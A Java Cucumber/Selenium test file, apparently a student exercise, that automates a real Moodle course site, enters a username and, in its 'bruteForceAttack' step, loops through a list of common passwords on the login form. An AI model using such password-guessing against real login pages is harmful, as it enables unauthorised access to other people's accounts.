package moodle;

import cucumber.api.java.After;
import cucumber.api.java.Before;
import cucumber.api.java.en.And;
import cucumber.api.java.en.Then;
import cucumber.api.java.en.When;
import org.openqa.selenium.By;
import org.openqa.selenium.Keys;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.firefox.FirefoxDriver;
import org.openqa.selenium.support.ui.WebDriverWait;

public class Moodle {
   private WebDriver driver = null;
   private WebDriverWait wait;
   private WebElement webElement;
   @Before
   public void before() {
      System.setProperty("webdriver.chrome.driver",  "C:\\Users\\Marius\\Documents\\GitHub\\spring\\PAVYZDŽIAI\\simpleexample\\src\\main\\resources\\chromedriver.exe");
      driver = new ChromeDriver();
      driver.navigate().to("http://moodle.viko.lt/course/category.php?id=6");
   }
   @After
   public void after() {
      driver.quit();
   }

//   @Given("^I am on Facebook login page$")
//   public void goToFacebook() {
//
//   }

   @When("^I enter course as \"(.*)\"$")
   public void enterCourse(String arg1) {
      driver.findElement(By.id("navsearchbox")).sendKeys(arg1);
   }

   @When("^I hit enter button as \"(.*)\"$")
   public void hitEnterButton(String arg1) {
      //driver.findElement(By.id("pass")).sendKeys(arg1);
    //  driver.findElement(By.id("navsearchbox")).sendKeys(":enter");
      driver.findElement(By.id("navsearchbox")).sendKeys(Keys.ENTER);
      wait = new WebDriverWait(driver,30);
      //driver.findElement(By.c;
   }
   @And("^I enter username$")
   public void iEnterUsername() throws InterruptedException {
      driver.navigate().to("http://moodle.viko.lt/course/view.php?id=1459");

      // Write code here that turns the phrase above into concrete actions
      driver.findElement(By.id("username")).sendKeys("studentas");
   }


   @Then("^Login should fail$")
   public void checkFail() throws InterruptedException {

      //driver.findElement(By.tagName("body")).sendKeys("Keys.ESCAPE");

      driver.close();
   }


    @And("^I start bruteForceAttack$")
    public void iStartBruteForceAttack() throws Throwable {
       // Write code here that turns the phrase above into concrete actions

       String brute_force[] = {"abc123", "256666", "hello", "password", "admin", "user", "studentas",
               "sda", "ace", "boom", "crew", "dog", "eon", "ace", "boom", "crew", "dog", "eon"};

       for (int i = 0; i < brute_force.length; i++) {
          driver.findElement(By.id("password")).sendKeys(brute_force[i]);
          driver.findElement(By.id("password")).sendKeys(Keys.ENTER);
         // Thread.sleep(1000);
       }
    }
}